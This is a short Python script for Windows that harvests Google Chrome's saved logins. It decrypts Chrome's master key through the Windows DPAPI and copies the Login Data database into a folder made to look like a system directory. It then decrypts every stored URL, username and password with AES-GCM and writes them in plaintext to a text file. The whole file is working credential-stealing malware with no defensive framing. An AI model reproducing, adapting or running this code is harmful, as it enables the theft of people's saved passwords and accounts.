import os
import sqlite3
import shutil
import base64
import win32crypt
import json
from Crypto.Cipher import AES


#   path to the key
dir_master_key = f"C:\\Users\\{os.environ.get('USERNAME')}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"

#   database path
dir_bd = f"C:\\Users\\{os.environ.get('USERNAME')}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"


def get_master_key():
    """
    take the decryption key
    """
    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r",
              encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    # key decryption
    master_key_chrome = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key_chrome = master_key_chrome[5:]
    master_key_chrome = win32crypt.CryptUnprotectData(master_key_chrome, None, None, None, 0)[1]
    return master_key_chrome


def chrome():
    """
    opening the database, decrypting the data and saving the results to a file
    """
    master_key = get_master_key()
    shutil.copy2(dir_bd, r"C:\System32\x25x02x42\Loginvault.db")
    # Connect to sqlite database
    conn = sqlite3.connect(r"C:\System32\x25x02x42\Loginvault.db")
    cursor = conn.cursor()
    # Select statement to retrieve info
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    for index, login in enumerate(cursor.fetchall()):
        url = login[0]
        username = login[1]
        ciphertext = login[2]
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = AES.new(master_key, AES.MODE_GCM, initialisation_vector)
        password = (cipher.decrypt(encrypted_password)).decode()
        answer = f'\n "url:" {url}\n "username" {username}\n "password" {password}\n'
        with open(r"C:\System32\x25x02x42\chrome_passwords.txt", 'a', encoding="utf-8") as f:
            f.write(answer)
